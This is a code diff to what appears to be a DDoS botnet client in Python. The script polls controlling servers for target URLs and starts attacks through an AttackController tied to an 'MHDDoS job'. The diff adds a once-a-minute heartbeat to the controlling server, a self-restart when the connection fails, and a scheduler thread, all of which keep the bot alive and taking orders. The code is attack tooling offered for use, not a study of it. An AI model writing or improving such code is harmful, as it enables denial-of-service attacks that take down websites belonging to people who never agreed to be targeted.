@@ -14,6 +14,8 @@ import time
 import threading
 import os
 import sys
+import schedule  # Import the schedule library
+
 
 class ThreadManager:
     def __init__(self):
@@ -61,6 +63,21 @@ def stop():
     thread_manager.stop_all_threads()
     # Add logic to stop the MHDDoS job or perform any necessary cleanup
     print("Stopping the current job")
+
+def hi():
+    try:
+        # Run the hi function every 1 minute
+        response = requests.get(f"{base_urls[0]}/hi/").json()
+        if response["status"] == "ok":
+            print("Hi request successful!")
+    except requests.ConnectionError as e:
+        print(f"Exception: {e}")
+        print(f"Restarting the script...")
+        python = sys.executable
+        os.execl(python, python, *sys.argv)
+
+schedule.every(1).minutes.do(hi)
+
 
 def ping(base_url, attack_controller):
     global current_target
@@ -121,19 +138,27 @@ def work(target, attack_controller):
     global current_target
     current_target = target
     # Perform the specified job based on job_type
-    # if target["job_type"] == "DDoS":
     attack_controller.start_attack()
-    # checker.run(target["url"])
     # Add additional conditions for other job types if needed
+
+def pending():
+    while True:
+        schedule.run_pending()
+        time.sleep(1)
+
 
 # Add a loop to run the ping function for each base URL every 5 seconds
 if __name__ == "__main__":
     try:
+        thread = threading.Thread(target=pending, name="Pending stuff")
+        thread.start()
         while True:
             for base_url in base_urls:
                 target_url = get_target(base_url)["url"]
                 attack_controller = AttackController(target_url)
                 ping(base_url, attack_controller)
+
+                
             time.sleep(5)  # Sleep for 5 seconds before the next iteration
 
     except KeyboardInterrupt:
